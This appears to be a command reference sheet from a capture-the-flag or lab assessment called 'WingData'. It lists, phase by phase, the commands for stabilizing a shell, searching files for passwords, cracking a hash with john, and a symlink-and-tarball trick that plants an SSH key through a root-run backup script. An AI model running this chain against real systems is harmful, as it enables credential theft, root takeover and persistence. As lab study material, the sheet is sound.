```markdown
# WingData Command Reference Sheet

This list documents every unique command used during the WingData assessment, categorized by the phase of the attack.

### **1. Shell Stabilization & Environment**
* `python3 -c 'import pty; pty.spawn("/bin/bash")'`: Spawns a pseudo-terminal (PTY) to allow interactive commands.
* `stty raw -echo; fg`: Switches the local terminal to raw mode to pass shortcuts like `Ctrl+C` through to the remote shell.
* `export TERM=xterm`: Sets the terminal type so commands like `nano` or `clear` work correctly.

### **2. Enumeration & Discovery**
* `ps -ef | grep ftp`: Searches for the Wing FTP process to identify installation directories and running users.
* `ls -ld /opt/backup_clients/*`: Checks directory permissions to see if the current user has write access (`rwx`).
* `grep -ri "password" Data/`: Recursively searches all files in the `Data` directory for credentials.

### **3. Cryptography & Cracking**
* `echo "HASH" > hash.txt`: Saves the recovered hash to a file for local processing.
* `john --format=raw-sha256 --wordlist=rockyou.txt hash.txt`: Attempts to crack the SHA-256 hash using a common wordlist.

### **4. Exploitation & File Transfer**
* `scp CVE-POC.py wacky@10.129.244.106:/tmp/`: Transfers the exploit script from the attack machine to the target via SSH.
* `ln -s /etc /opt/backup_clients/restored_backups/restore_pwn`: Creates a symbolic link to point the vulnerable script toward the system configuration folder.
* `ssh-keygen -t rsa -f pwn -N ""`: Generates a password-less SSH key pair to be used for root persistence.
* `tar -cvf backup_1337.tar .ssh`: Packages a local `.ssh` folder into a tarball to pass through the restoration script.

### **5. Privilege Escalation**
* `sudo -l`: Lists the sudo permissions available to the current user.
* `sudo /usr/local/bin/python3 /path/to/script.py -b backup.tar -r restore_tag`: Executes the vulnerable Python script with root privileges.
